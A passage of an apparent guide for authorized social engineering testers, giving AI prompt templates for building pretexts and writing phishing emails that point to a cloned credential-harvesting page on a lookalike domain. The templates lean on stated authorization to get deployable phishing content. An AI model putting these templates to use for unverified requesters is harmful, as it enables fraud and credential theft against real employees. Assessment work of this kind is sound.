# Social Engineering Operations: AI-Assisted Pretext Development and Campaign Creation

## ⚠️ CRITICAL LEGAL AND ETHICAL NOTICE

**ALL CONTENT IN THIS DOCUMENT ASSUMES PROPER AUTHORIZATION**

These starter prompts are designed exclusively for authorized security professionals conducting legitimate social engineering assessments under written contract. Using these techniques without proper authorization is illegal and unethical.

**Requirements for lawful use:**
- Written authorization (contract, Statement of Work, explicit engagement letter)
- Clearly defined scope including social engineering authorization
- Legal review of engagement terms and liability protections
- Client approval for specific pretext scenarios and target lists
- Professional liability insurance and legal counsel access

**CRITICAL BOUNDARIES:**
- Social engineering without authorization is fraud, impersonation, or worse
- Even passive OSINT collection for unauthorized SE is legally problematic
- "Practicing" these techniques on unauthorized targets is criminal activity
- No technique justifies exceeding your authorized scope

**The authors and contributors bear ABSOLUTELY NO responsibility for:**
- Unauthorized use of these techniques
- Legal consequences of improper application
- Damage caused by exceeding authorized scope
- Misuse for malicious, criminal, or unethical purposes

**IF YOU DO NOT HAVE WRITTEN AUTHORIZATION FOR SOCIAL ENGINEERING, STOP NOW.**

This document is for educational and professional consulting purposes only. By using these prompts, you accept full personal responsibility for ensuring you have proper authorization and are operating within legal and ethical boundaries.

---

## Table of Contents

1. [How to Use This Guide](#how-to-use-this-guide)
2. [Authorization Verification](#authorization-verification)
3. [Section 1: Pretext Development & Validation](#section-1-pretext-development--validation)
4. [Section 2: Phishing Email Campaign Development](#section-2-phishing-email-campaign-development)
5. [Section 3: Credential Harvesting Landing Page Creation](#section-3-credential-harvesting-landing-page-creation)
6. [Section 4: Vishing Script Development](#section-4-vishing-script-development)
7. [Infrastructure & Operational Security Considerations](#infrastructure--operational-security-considerations)
8. [Testing & Validation Workflows](#testing--validation-workflows)
9. [Legal & Ethical Reminders](#legal--ethical-reminders)

---

## How to Use This Guide

### Workflow Overview

These are **modular, independent prompts** for specific social engineering tasks. Each section stands alone and can be used without completing other sections.

**For each section:**

1. **Verify authorization** - Confirm your engagement explicitly permits the specific technique
2. **Gather required OSINT** - Copy relevant intelligence from your reconnaissance
3. **Copy the prompt template** - Paste into your text editor
4. **Fill in your context** - Replace placeholders with your engagement details
5. **Customize for specificity** - Add/remove elements based on your needs
6. **Paste to AI tool** - Use enterprise AI with DPA when possible
7. **Download generated content** - Save AI output to secure local storage
8. **Verify and test** - Never deploy without validation
9. **Document what was used** - Maintain audit trail of SE materials

### Storage and Handling

**Generated Content Security:**

🏢 **Enterprise AI with DPA:**
- Download all generated SE content immediately
- Store in secure client engagement folder
- Never leave sensitive pretext content in AI chat history
- Follow client data handling requirements

🌐 **Consumer AI (use with extreme caution):**
- Sanitize ALL inputs (no real client names, emails, domains)
- Download and re-create content with real details in secure environment
- Assume consumer AI prompts may be retained or used for training
- Consider legal/ethical implications of exposing engagement details

**Best Practices:**
- Store generated content separately from deployment infrastructure
- Version control your prompts and generated materials
- Document which materials were actually deployed vs. created but unused
- Maintain clear audit trail for client reporting

### Customization Philosophy

These prompts are **frameworks, not templates**. You must customize for:
- Your specific target organization's culture
- Your engagement authorization boundaries
- Your pretext scenario requirements
- Your technical infrastructure capabilities

**Do NOT use these prompts without modification.** Generic outputs are ineffective and potentially detectable.

### AI Tool Selection for Social Engineering

**Recommended: Enterprise AI with Data Processing Agreement**
- Client-specific details (names, emails, domains) require confidentiality
- Generated SE content contains engagement-sensitive information
- DPA ensures content isn't used for model training
- Provides audit trail and data retention controls

**Consumer AI Warning:**
- Only use with complete sanitization of client details
- Understand generated content may be retained
- Re-create final materials in secure environment
- Consider compliance and legal implications

---

## Authorization Verification

**Before using ANY section in this guide, verify:**

### Comprehensive Authorization Checklist

**Written Authorization:**
- [ ] I have a signed contract/SOW explicitly authorizing social engineering
- [ ] The contract specifies which SE techniques are permitted (email, phone, etc.)
- [ ] The engagement includes specific target lists or selection criteria
- [ ] The authorization includes timeframes for SE campaign execution
- [ ] I have client contact information for scope clarification questions

**Legal Protection:**
- [ ] Contract includes liability protections for authorized SE activities
- [ ] Legal counsel has reviewed engagement terms
- [ ] Professional liability insurance covers SE assessments
- [ ] I understand local laws regarding impersonation and fraud
- [ ] Client understands and accepts potential business disruption

**Scope Definition:**
- [ ] Target individuals/roles are clearly defined
- [ ] Prohibited targets are explicitly documented (executives, certain departments)
- [ ] Prohibited pretexts are documented (law enforcement, medical emergency)
- [ ] Geographic/jurisdictional boundaries are clear
- [ ] Third-party impersonation boundaries are established

**Technical Boundaries:**
- [ ] Permitted SE delivery methods are specified (email, phone, SMS, physical)
- [ ] Credential harvesting authorization is explicit
- [ ] Data collection limitations are documented
- [ ] Infrastructure requirements are approved (domains, phone numbers)
- [ ] Malware/payload restrictions are clear

**Operational Constraints:**
- [ ] Campaign timing restrictions are documented (business hours only, etc.)
- [ ] Volume/scale limitations are agreed (max targets, max attempts)
- [ ] Escalation procedures are defined (if target reports SE attempt)
- [ ] Success criteria are established (what constitutes "compromise")
- [ ] Reporting requirements are clear

**Client Coordination:**
- [ ] Primary client contact is identified
- [ ] Emergency contact procedures are established
- [ ] Notification requirements are documented (before, during, after campaign)
- [ ] Client IR team is aware of planned SE activity
- [ ] Exclusion process exists (targets who should be removed)

**IF ANY BOX IS UNCHECKED, STOP AND RESOLVE BEFORE PROCEEDING.**

### Scope Verification Questions

Before creating SE materials, ask yourself:

1. **Is this specific pretext authorized?**
   - Generic "phishing" authorization may not cover every scenario
   - Impersonating specific organizations may require additional approval
   - Financial pretexts often have higher approval requirements

2. **Are these specific targets authorized?**
   - Executive leadership often excluded
   - Certain departments may be off-limits (legal, HR, security)
   - International targets may have jurisdictional issues

3. **Is this delivery method authorized?**
   - Email authorization doesn't imply phone authorization
   - Physical SE may be completely prohibited
   - SMS/text messaging may have separate approval requirements

4. **What happens if targets respond?**
   - Who handles inbound calls to vishing numbers?
   - What if target emails asking to verify legitimacy?
   - What if target falls for pretext but requests money transfer?

5. **What are the stop conditions?**
   - If certain number of people report it, do we stop?
   - If client requests halt mid-campaign, what's the procedure?
   - What if unintended consequences occur (PR issue, operational disruption)?

**If you cannot answer these questions with confidence, consult your client contact before proceeding.**

---

## Section 1: Pretext Development & Validation

### When to Use This Section

Use this prompt when you need to develop believable social engineering scenarios (pretexts) based on target organization intelligence. This should happen BEFORE creating specific emails, scripts, or landing pages.

### Why This Is Separate

Pretext development requires strategic thinking about organizational culture, business operations, and psychological factors. It's distinct from tactical execution (writing emails or building pages). Good pretexts inform all subsequent SE materials.

### Required Intelligence from OSINT

Before using this prompt, you should have completed reconnaissance to gather:

**From OSINT Phase 1 (Organizational Structure):**
- Company culture observations
- Communication patterns and tone
- Organizational hierarchy
- Department structures
- Key roles and responsibilities

**From OSINT Phase 3 (Digital Footprint):**
- Employee social media activity patterns
- Company social media themes
- Public-facing communication style
- Recent company announcements or changes

**From OSINT Phase 4 (Business Context):**
- Technology vendors and partners
- Industry context and regulatory environment
- Recent business changes (acquisitions, leadership changes)
- Customer/partner relationships

If you haven't completed relevant OSINT collection, refer to the OSINT Synthesis prompt to gather this intelligence first.

---

### Starter Prompt: Pretext Development

```markdown
I am conducting an authorized social engineering assessment and need to develop believable pretext scenarios that align with the target organization's culture, operations, and current business context.

ENGAGEMENT AUTHORIZATION:
Client: [YOUR_CLIENT_NAME]
🏢 Enterprise: "TechCorp Industries - Social Engineering Assessment Contract #SE-2024-091"
🌐 Consumer: "Authorized client - social engineering engagement"

Engagement Type: [ASSESSMENT_TYPE]
Examples: "Phishing simulation", "Comprehensive social engineering assessment", "Targeted spear-phishing campaign"

Social Engineering Authorization Scope: [WHAT'S EXPLICITLY PERMITTED]
🏢 Enterprise: "Email-based phishing authorized for all employees except C-suite and legal department. Phone-based vishing authorized for IT helpdesk and standard employees. Credential harvesting authorized. NO impersonation of law enforcement or emergency services."
🌐 Consumer: "Email and phone social engineering authorized within defined scope. Credential collection permitted. Prohibited pretexts documented separately."

Target Audience: [WHO ARE YOU TARGETING]
🏢 Enterprise: "Primary: IT helpdesk staff and system administrators (approximately 25 people). Secondary: General employee population (approximately 500 people)."
🌐 Consumer: "Target roles: [specific departments/roles], Approximate size: [number]"

Assessment Objectives: [WHAT YOU'RE TRYING TO DEMONSTRATE]
Examples:
- "Test effectiveness of security awareness training"
- "Assess susceptibility to vendor impersonation attacks"
- "Evaluate credential security and MFA adoption"
- "Demonstrate supply chain social engineering risks"

Assessment Timeline: [WHEN CAMPAIGN WILL RUN]
Example: "Campaign deployment: December 10-17, 2024. Business hours only (9 AM - 6 PM EST)."

ORGANIZATIONAL INTELLIGENCE:

Company Context:
🏢 Enterprise:
- Industry: Healthcare Technology
- Size: ~500 employees
- Maturity: Growth stage (Series B funded, expanding rapidly)
- Culture: Fast-paced startup culture, emphasis on innovation and agility
- Recent Changes: Recent acquisition of smaller company, new CISO hired 3 months ago

🌐 Consumer:
- Industry: [sector]
- Size: [employee count range]
- Maturity: [startup/growth/established]
- Culture: [observed cultural characteristics]
- Recent Changes: [any significant organizational changes]

Communication Patterns:
🏢 Enterprise:
- Email tone: Generally informal, frequent use of emojis in internal communications
- Common tools: Slack for internal, email for external, heavy Microsoft 365 usage
- Authentication: Migrating to mandatory MFA (currently ~60% adoption)
- IT Support: Helpdesk tickets through Jira Service Desk, also accepts phone calls

🌐 Consumer:
- Email tone: [formal/informal/mixed]
- Common tools: [observed communication platforms]
- Authentication: [authentication methods in use]
- IT Support: [how employees get technical help]

Technology & Vendor Context:
🏢 Enterprise:
- Primary vendors: AWS (infrastructure), Auth0 (authentication), CrowdStrike (security)
- Recent technology changes: Migrating from on-premise to cloud (ongoing)
- Security posture: Small security team (4 people), recent investment in security tools
- Current initiatives: MFA rollout, security awareness training program launched

🌐 Consumer:
- Primary vendors: [key technology partners]
- Recent technology changes: [migrations, upgrades, new tools]
- Security posture: [team size, security maturity indicators]
- Current initiatives: [ongoing security/IT projects]

Current Business Context:
🏢 Enterprise:
- Recent acquisition: Acquired "MedTech Startup" 2 months ago, integration in progress
- Regulatory environment: HIPAA compliance required, recent SOC 2 certification effort
- Business pressures: Rapid growth, new customer onboarding, year-end deadlines
- Public announcements: Press release about expansion into European market

🌐 Consumer:
- Recent events: [acquisitions, partnerships, major announcements]
- Regulatory environment: [compliance requirements, recent audits]
- Business pressures: [seasonal pressures, deadlines, growth challenges]
- Public visibility: [recent news, press releases, public statements]

Employee Characteristics:
🏢 Enterprise:
- Technical sophistication: Mixed - IT staff highly technical, general employees less so
- Security awareness: Recent training implemented, but low baseline awareness observed
- Common pain points: VPN reliability issues, frequent password resets, MFA friction
- Social media activity: Executives very active on LinkedIn, engineers active on Twitter/X

🌐 Consumer:
- Technical sophistication: [observed skill levels by role]
- Security awareness: [training programs, observed awareness indicators]
- Common pain points: [technical frustrations, frequently discussed issues]
- Social media activity: [public visibility patterns]

PRETEXT REQUIREMENTS:

Campaign Goals:
[What should this pretext achieve?]
Examples:
- "Credential harvesting to demonstrate authentication risks"
- "Clicking links to measure security awareness effectiveness"
- "Phone-based password resets to test helpdesk procedures"
- "Downloading attachments to assess endpoint security controls"

Target Personas:
[Who specifically are you targeting with this pretext?]
🏢 Enterprise:
- Persona 1: IT Helpdesk Staff
  - Technical level: High
  - Responsibilities: Password resets, account management, technical troubleshooting
  - Pain points: High ticket volume, urgent requests, after-hours escalations
  - Likely triggers: Urgent executive requests, vendor support needs, system alerts

- Persona 2: General Employees
  - Technical level: Low to Medium
  - Responsibilities: Daily business operations
  - Pain points: Technology frustrations, MFA friction, unclear IT policies
  - Likely triggers: IT support communications, benefits/HR notices, training requirements

🌐 Consumer:
- Persona 1: [role/department]
  - Technical level: [low/medium/high]
  - Responsibilities: [what they do]
  - Pain points: [their frustrations]
  - Likely triggers: [what would make them respond]

Pretext Constraints:
[What pretexts are PROHIBITED?]
Examples:
- "NO impersonation of law enforcement or regulatory agencies"
- "NO medical emergency or personal safety threats"
- "NO impersonation of client executives by name"
- "NO financial transaction requests (wire transfers, gift cards)"
- "NO pretexts targeting personal life (family, health, finances)"

Delivery Methods:
[How will this pretext be delivered?]
- [ ] Email phishing
- [ ] Phone vishing
- [ ] SMS smishing
- [ ] Physical mail
- [ ] In-person social engineering

TASK FOR AI:

Based on the organizational intelligence and requirements provided, help me develop 3-5 distinct pretext scenarios that:

1. **Align with organizational culture and communication patterns**
   - Use appropriate tone and language for this organization
   - Reference realistic business contexts and operations
   - Incorporate current events or initiatives when relevant

2. **Target specific personas effectively**
   - Create different pretexts for different target groups
   - Leverage known pain points and triggers
   - Consider technical sophistication of each persona

3. **Remain within authorized boundaries**
   - Respect all prohibited pretext constraints
   - Stay within approved delivery methods
   - Align with stated assessment objectives

4. **Are operationally feasible**
   - Can be implemented with available resources
   - Support the intended credential harvesting or awareness testing goals
   - Include realistic details that can be created/supported

For each pretext scenario, provide:

**Pretext Name:** [Brief identifying name]

**Target Persona:** [Which target group this is designed for]

**Delivery Method:** [Email/Phone/SMS/etc.]

**Cover Story:** [The narrative - who you're pretending to be and why you're contacting them]

**Psychological Triggers:** [What motivates targets to respond - urgency, curiosity, fear, helpfulness, authority, etc.]

**Supporting Details Needed:** [What infrastructure, accounts, or materials would be required to make this believable]

**Likelihood of Success:** [Your assessment: High/Medium/Low and why]

**Detection Risk:** [How likely targets are to report this as suspicious]

**Variations:** [How this pretext could be adapted for different targets or campaigns]

**CRITICAL CONSTRAINTS:**

You must:
✅ Base pretexts on the ACTUAL organizational intelligence I provided
✅ Consider the current business context and recent changes
✅ Respect all prohibited pretext constraints I specified
✅ Create realistic scenarios that could plausibly occur in this organization
✅ Account for the target's technical sophistication and role

You must NOT:
❌ Suggest pretexts that violate my stated prohibitions
❌ Create generic scenarios disconnected from this organization's context
❌ Assume capabilities or infrastructure I haven't mentioned
❌ Recommend pretexts that are obviously illegal or unethical
❌ Suggest targets or delivery methods outside my authorization

Focus on creating believable, contextually appropriate pretexts that will effectively test this organization's security awareness while remaining within my authorized scope and ethical boundaries.
```

---

### Using This Prompt

**Workflow:**

1. **Complete OSINT collection** for organizational context
2. **Fill in all sections** with your specific engagement details
3. **Paste to AI tool** (enterprise AI strongly recommended)
4. **Review generated pretexts** against your authorization and constraints
5. **Select 1-2 strongest pretexts** for development into campaigns
6. **Document your selection** and rationale for audit trail

**Iteration Guidance:**

**If pretexts are too generic:**
```markdown
Your pretext suggestions were too generic. I need scenarios that specifically leverage:

1. [Specific organizational detail from my intelligence]
2. [Specific current business event or pressure]
3. [Specific vendor or technology relationship]

Revise the pretexts to incorporate these SPECIFIC elements from my target organization, not general "IT support" or "password reset" scenarios that could apply to any company.
```

**If you need variations for different audiences:**
```markdown
I like [SPECIFIC PRETEXT NAME] but need to create variations for:
- Technical audience (IT staff, developers)
- Non-technical audience (HR, Sales, General employees)
- Management level employees

How should I adapt [PRETEXT NAME] for each audience while maintaining the core scenario?
```

**If pretexts seem outside scope:**
```markdown
You suggested [PRETEXT] but this seems to violate [SPECIFIC CONSTRAINT].

Please revise while strictly adhering to:
- Prohibited actions: [restate prohibitions]
- Authorized delivery methods: [restate methods]
- Target restrictions: [restate target boundaries]
```

**If you need operational feasibility check:**
```markdown
For [PRETEXT NAME], I need to understand implementation requirements:

1. What domain/email infrastructure do I need?
2. What supporting websites or phone numbers must exist?
3. What identity verification might targets perform?
4. What follow-up actions must I be prepared for?
5. How long can this pretext remain active before becoming stale?

Provide specific operational requirements to make this pretext credible.
```

---

### Verification Checklist

Before proceeding to develop campaign materials (emails, pages, scripts) based on selected pretexts:

**Authorization Validation:**
- [ ] Selected pretext aligns with engagement scope
- [ ] Delivery method is explicitly authorized
- [ ] Target personas are within authorized target list
- [ ] No prohibited elements are present
- [ ] Client contact approved pretext scenario (if required by engagement)

**Operational Feasibility:**
- [ ] Required infrastructure is available or obtainable
- [ ] Supporting details can be created/maintained
- [ ] Team has capability to handle target responses
- [ ] Timeline allows for proper implementation
- [ ] Detection risk is acceptable for engagement objectives

**Believability Assessment:**
- [ ] Pretext aligns with organizational culture
- [ ] Timing is appropriate (not conflicting with known events)
- [ ] Technical details are accurate for the organization
- [ ] Tone matches observed communication patterns
- [ ] Supporting infrastructure would appear legitimate

**Ethical Boundaries:**
- [ ] No exploitation of personal vulnerabilities
- [ ] No creation of genuine panic or distress
- [ ] No pretexts that could cause actual business harm
- [ ] No impersonation crossing legal lines
- [ ] Professional judgment says this is appropriate

**Documentation:**
- [ ] Pretext selection rationale documented
- [ ] Supporting OSINT references captured
- [ ] Risk assessment completed
- [ ] Approval trail is clear
- [ ] Variations and alternatives noted

---

### Common Mistakes to Avoid

❌ **Using pretexts without organizational context**
- Generic "password reset" or "account verification" fails quickly
- Targets are trained to recognize generic phishing patterns

❌ **Ignoring current business events**
- Pretext about "annual security training" in March when company does training in October
- Missing opportunity to leverage actual ongoing initiatives

❌ **Overestimating target technical sophistication**
- Highly technical pretext for non-technical audience confuses rather than convinces
- Target needs to understand enough to respond, not enough to detect

❌ **Creating operationally infeasible pretexts**
- Pretext requires infrastructure you can't create or maintain
- Follow-up actions you're not prepared to handle

❌ **Prohibited pretext elements**
- Using executive names when engagement prohibits it
- Financial urgency when wire transfer pretexts are forbidden
- Any element that violates your scope

❌ **Poor timing**
- Campaign during known vacation periods or major events
- Pretext referencing outdated technology or completed initiatives

❌ **Inconsistent supporting details**
- Email domain doesn't match claimed sender organization
- Phone number area code doesn't match claimed location
- Website design inconsistent with claimed brand

---

### Next Steps

After developing and validating pretexts:

**Create Campaign Materials:**
- Use Section 2 to develop phishing emails based on selected pretext
- Use Section 3 to build landing pages supporting the pretext
- Use Section 4 to create vishing scripts aligned with pretext

**Prepare Infrastructure:**
- Register domains that support the pretext
- Configure email servers with proper SPF/DKIM
- Set up phone numbers or VoIP infrastructure
- Build supporting websites or resources

**Test Pretext Validity:**
- Internal team review of pretext believability
- Test with non-target members of client organization (if permitted)
- Verify supporting infrastructure appears legitimate
- Confirm all details are accurate and consistent

---

## Section 2: Phishing Email Campaign Development

### When to Use This Section

Use this prompt when you have a validated pretext (from Section 1) and need to create specific phishing emails that will be sent to target employees. This generates actual email content ready for deployment.

### Why This Is Separate

Email composition requires different considerations than pretext strategy: specific language, formatting, technical implementation, and delivery mechanisms. This section focuses on tactical email creation after strategic pretext is established.

### Required Intelligence

**From Section 1 (Pretext Development):**
- Selected pretext scenario
- Target personas
- Psychological triggers
- Supporting details

**From OSINT Synthesis:**
- Email communication patterns and tone
- Company email formatting conventions
- Sender names and titles that would be believable
- Current initiatives or events to reference

**Additional Technical Requirements:**
- Sending domain and infrastructure
- Landing page URL (if applicable)
- Reply-to address strategy
- Email authentication setup (SPF, DKIM, DMARC considerations)

---

### Starter Prompt: Phishing Email Creation

```markdown
I am conducting an authorized phishing simulation and need to create specific email content based on a validated pretext scenario. The email must be contextually appropriate, technically sound, and aligned with my engagement authorization.

ENGAGEMENT AUTHORIZATION:
Client: [YOUR_CLIENT_NAME]
🏢 Enterprise: "TechCorp Industries - Phishing Assessment Contract #SE-2024-091"
🌐 Consumer: "Authorized phishing simulation engagement"

Authorization Scope: [SPECIFIC EMAIL CAMPAIGN PERMISSIONS]
🏢 Enterprise: "Email phishing authorized for all employees except C-suite and legal department. Credential harvesting pages authorized. No malware/attachments. Campaign dates: Dec 10-17, 2024."
🌐 Consumer: "Email campaign authorized for [target population], [date range]"

Campaign Objective: [WHAT YOU'RE TESTING]
Examples:
- "Test credential security - measure who enters passwords on phishing page"
- "Assess link-clicking behavior - track who clicks malicious links"
- "Evaluate reporting behavior - monitor who reports suspicious emails"
- "Test MFA resilience - see if MFA prompts stop credential compromise"

PRETEXT CONTEXT:

Selected Pretext: [NAME OF PRETEXT FROM SECTION 1]
🏢 Enterprise: "IT Security MFA Enrollment Verification"

Pretext Summary: [BRIEF DESCRIPTION]
🏢 Enterprise: "Organization is rolling out mandatory MFA. Employees must verify their MFA enrollment by December 15th or accounts will be temporarily locked. Email directs to verification portal (credential harvesting page)."

Target Persona: [WHO THIS EMAIL TARGETS]
🏢 Enterprise: "General employee population - non-technical users, low to medium security awareness"

Psychological Triggers: [WHAT MOTIVATES RESPONSE]
🏢 Enterprise: "Urgency (deadline approaching), Authority (IT Security mandate), Consequence avoidance (account lockout fear), Compliance (doing what they're told)"

ORGANIZATIONAL EMAIL PATTERNS:

Communication Style:
🏢 Enterprise:
- Tone: Professional but friendly, occasionally uses exclamation points for emphasis
- Formality: First names common, "Hi [Name]" greetings typical
- Length: Usually brief (2-3 short paragraphs), bullets for action items
- Sign-offs: "Thanks," or "Best," with full name and title
- Branding: IT department emails include small company logo in signature

🌐 Consumer:
- Tone: [formal/informal/mixed]
- Formality: [greeting conventions]
- Length: [typical email length]
- Sign-offs: [common closings]
- Branding: [signature conventions, logos]

Legitimate IT Communication Examples:
[Paste examples of REAL IT communications from target organization, if available through OSINT]
🏢 Enterprise:
"Subject: Action Required: VPN Certificate Renewal
Hi Team,
Your VPN certificates expire on Nov 30th! Please renew by clicking the link below.
[link]
Questions? Contact IT Support.
Thanks,
Mike Chen
IT Infrastructure"

🌐 Consumer:
[Example 1 of legitimate internal communication]
[Example 2 if available]

Common IT Sender Names:
🏢 Enterprise:
- "IT Support" <itsupport@techcorp.com>
- "Mike Chen, IT Director" <mchen@techcorp.com>
- "Security Team" <security@techcorp.com>
- "Helpdesk" <helpdesk@techcorp.com>

🌐 Consumer:
- [Typical sender name 1]
- [Typical sender name 2]

Current Organizational Context:
🏢 Enterprise:
- MFA rollout is actually happening (60% adoption currently)
- Recent security awareness training mentioned MFA benefits
- Employees have been complaining about MFA friction
- IT has sent 2-3 legitimate MFA-related emails in past month

🌐 Consumer:
- [Current IT initiatives or changes]
- [Recent legitimate IT communications]
- [Known employee pain points]

TECHNICAL EMAIL REQUIREMENTS:

Sending Infrastructure:
🏢 Enterprise:
- Sending domain: techcorp-security.com (registered for assessment)
- Sending address: security-admin@techcorp-security.com
- SPF/DKIM configured: Yes
- Reply-to address: noreply@techcorp-security.com (monitored for responses)

🌐 Consumer:
- Sending domain: [your domain]
- Sending address: [from address]
- Email authentication: [configured or not]
- Reply-to strategy: [address and monitoring]

Landing Page Details:
🏢 Enterprise:
- URL: https://mfa-verify.techcorp-security.com/verify
- Purpose: Credential harvesting (username + password collection)
- Appearance: Cloned from actual TechCorp login page
- HTTPS: Yes (valid SSL certificate)

🌐 Consumer:
- URL: [your landing page URL]
- Purpose: [what the page does]
- Appearance: [cloned/original design]
- HTTPS: [yes/no]

Tracking/Metrics:
🏢 Enterprise:
- Email opens tracked: Yes (tracking pixel)
- Link clicks tracked: Yes (unique URLs per recipient)
- Credentials submitted: Yes (captured via landing page)
- Reporting tracked: Yes (watching for forwards to real IT/Security)

🌐 Consumer:
- [What you're tracking]
- [How you're tracking it]

TARGET RECIPIENT DETAILS:

Email List Characteristics:
🏢 Enterprise:
- Total recipients: 450 employees
- Target roles: All departments except C-suite and legal
- Email pattern: firstname.lastname@techcorp.com
- Personalization data available: First name, last name, department

🌐 Consumer:
- Total recipients: [number]
- Target roles: [departments/roles]
- Email pattern: [observed pattern]
- Personalization: [available data]

Timing Strategy:
🏢 Enterprise:
- Send date: Wednesday, December 11, 2024
- Send time: 10:00 AM EST (mid-morning, high email checking time)
- Waves: 3 waves spaced 2 hours apart to avoid detection patterns
- Follow-up: Reminder email 48 hours later for non-responders

🌐 Consumer:
- Send date: [planned date]
- Send time: [optimal time]
- Waves: [staggered or single send]
- Follow-up: [reminder strategy if applicable]

TASK FOR AI:

Based on all context provided, create a complete phishing email that:

1. **Matches organizational communication patterns**
   - Uses appropriate tone, formality, and language
   - Mimics legitimate IT communication style
   - Includes realistic formatting and structure

2. **Effectively delivers the pretext**
   - Clearly communicates the cover story
   - Provides believable context and urgency
   - Leverages psychological triggers appropriately

3. **Drives target action**
   - Clear call-to-action (click link, verify enrollment, etc.)
   - Removes friction from taking desired action
   - Makes action seem necessary and routine

4. **Remains technically sound**
   - Uses proper sending domain and addresses
   - Includes appropriate tracking elements
   - Avoids common spam triggers

5. **Stays within ethical boundaries**
   - No excessive panic or fear generation
   - No exploitation of personal vulnerabilities
   - Appropriate level of urgency for context

Provide the following outputs:

**EMAIL SUBJECT LINE:**
[Create 3 variations - test which performs best]

**EMAIL BODY (Plain Text Version):**
[Full email text with proper formatting, ready to use]

**EMAIL BODY (HTML Version - if needed):**
[HTML formatted version with styling]

**PERSONALIZATION TOKENS:**
[Indicate where to insert: {{FirstName}}, {{LastName}}, etc.]

**SENDER DETAILS:**
- From Name: [who email appears to be from]
- From Address: [email address]
- Reply-To: [reply address if different]

**SIGNATURE BLOCK:**
[Complete signature as it should appear]

**TIMING NOTES:**
[Any recommendations about when to send for maximum effectiveness]

**VARIATIONS FOR A/B TESTING:**
[If applicable, suggest variations to test different approaches]

**RED FLAGS TO AVOID:**
[Elements that might trigger spam filters or immediate suspicion]

**EXPECTED RESPONSE RATE:**
[Your estimate of likely click/response rate based on this approach]

**CRITICAL CONSTRAINTS:**

You must:
✅ Match the actual communication style of this organization
✅ Use the specific pretext scenario I provided
✅ Include the exact URLs and technical details I specified
✅ Create content that targets the specific persona
✅ Keep the email concise and actionable

You must NOT:
❌ Use generic phishing templates disconnected from my context
❌ Include elements not supported by my infrastructure
❌ Create excessive panic or personal threats
❌ Suggest techniques outside my authorization
❌ Assume organizational details I haven't provided

Generate email content that is ready to deploy after I verify it aligns with my authorization and organizational context.
```

---

### Using This Prompt

**Workflow:**

1. **Complete pretext development** (Section 1) before creating emails
2. **Set up technical infrastructure** (domain, landing page, tracking)
3. **Gather organizational communication examples** from OSINT
4. **Fill in prompt template** with your specific details
5. **Generate email content** via AI
6. **Download and save** generated content locally
7. **Test email** (send to yourself, check spam scores, verify links)
8. **Verify against authorization** before deployment

**Iteration Guidance:**

**If email tone doesn't match organization:**
```markdown
The email you generated sounds too [formal/informal/technical/generic].

Based on these ACTUAL examples from the target organization:
[Paste 1-2 real email examples]

Regenerate the email to match this specific communication style:
- Tone: [specific tone characteristics]
- Language: [specific word choices or phrases]
- Structure: [specific formatting patterns]

Make it sound like it genuinely came from this organization's IT team.
```

**If psychological triggers are too obvious:**
```markdown
The urgency in this email feels too aggressive/suspicious. I need to make it compelling but believable.

Revise to:
- Reduce urgency from [current level] to [more appropriate level]
- Add more legitimate business context: [specific context]
- Make the call-to-action feel more routine and less alarming

The goal is action without immediate suspicion.
```

**If you need multiple variations for testing:**
```markdown
I want to A/B test different approaches with this email. Create 3 variations:

Variation A: [Description - e.g., "Higher urgency, shorter length"]
Variation B: [Description - e.g., "Lower urgency, more detail and explanation"]
Variation C: [Description - e.g., "Helpful tone, emphasis on benefits"]

Keep the core pretext the same but adjust tone, urgency, and framing.
```

**If technical details need adjustment:**
```markdown
The email includes [TECHNICAL ELEMENT] but I need to modify this because [REASON].

Change:
- URL from [current] to [new URL]
- Sender name from [current] to [new name]
- Timing from [current] to [new timing]

Regenerate the email with these updated technical details while maintaining the same core content and persuasiveness.
```

**If you need subject line optimization:**
```markdown
The subject lines you provided are [too generic/too suspicious/too long].

Generate 5 new subject line variations that:
- Are under 50 characters
- Create curiosity or urgency without being obvious phishing
- Match typical IT communication subject lines
- Would be likely to be opened during busy workday

Rank them by estimated effectiveness for my target audience: [persona].
```

---

### Verification Checklist

Before deploying phishing emails:

**Content Validation:**
- [ ] Email tone matches organizational communication patterns
- [ ] Technical details are accurate (domains, URLs, sender names)
- [ ] Pretext scenario is clearly and believably communicated
- [ ] Call-to-action is clear and unambiguous
- [ ] Personalization tokens are correctly placed
- [ ] No spelling or grammatical errors
- [ ] No obvious phishing red flags

**Technical Validation:**
- [ ] Sending domain is registered and configured
- [ ] SPF, DKIM, DMARC records are properly set (if applicable)
- [ ] Landing page URL is functional and HTTPS
- [ ] Tracking mechanisms are working (opens, clicks)
- [ ] Reply-to address is monitored
- [ ] Email renders correctly in major email clients
- [ ] Not flagged by spam filters (test sends)

**Authorization Validation:**
- [ ] All recipients are within authorized target list
- [ ] Email content aligns with approved pretext
- [ ] No prohibited elements present (malware, extreme urgency, etc.)
- [ ] Timing aligns with engagement timeline
- [ ] Client notification requirements met (if applicable)

**Operational Readiness:**
- [ ] Team knows how to handle inbound responses
- [ ] Landing page is ready to receive traffic
- [ ] Monitoring/tracking is configured and tested
- [ ] Backup plan exists if campaign needs to stop
- [ ] Documentation is prepared for results reporting

**Ethical Validation:**
- [ ] Urgency level is appropriate (not creating panic)
- [ ] No exploitation of personal vulnerabilities
- [ ] Professional judgment says this is appropriate
- [ ] Potential business disruption is acceptable
- [ ] Client expectations are properly set

---

### Common Mistakes to Avoid

❌ **Generic phishing templates**
- "Your account will be locked" with no organizational context
- Templates that could apply to any company
- Obvious urgency with no supporting business reason

❌ **Technical inconsistencies**
- Domain doesn't match supposed sender organization
- URL shorteners (often suspicious to security-aware users)
- Broken links or non-functional tracking
- Poor mobile rendering

❌ **Tone mismatches**
- Overly formal email from organization with casual culture
- Technical jargon to non-technical audience
- Language that doesn't match geography (UK vs US English)

❌ **Excessive urgency or threats**
- "Account will be deleted TODAY"
- "Immediate action required or you'll be fired"
- Creating genuine panic or distress

❌ **Poor timing**
- Sending during vacation periods or holidays
- Sending late at night (suspicious for "IT department")
- Conflicting with known organizational events

❌ **Unsupported infrastructure**
- Links to pages that aren't ready
- Domains without proper SSL certificates
- Reply-to addresses that bounce or aren't monitored

❌ **Obvious phishing indicators**
- Misspelled domains (tech-corp instead of techcorp)
- Obviously suspicious URLs
- Requests for unusual information
- Poor grammar or spelling

---

### Testing Before Deployment

**Internal Testing:**
1. Send to your own email addresses
2. Check rendering in multiple email clients (Outlook, Gmail, Apple Mail)
3. Verify all links work correctly
4. Test personalization tokens populate correctly
5. Confirm tracking mechanisms function

**Spam Filter Testing:**
- Use mail-tester.com or similar services
- Check spam scores and fix issues
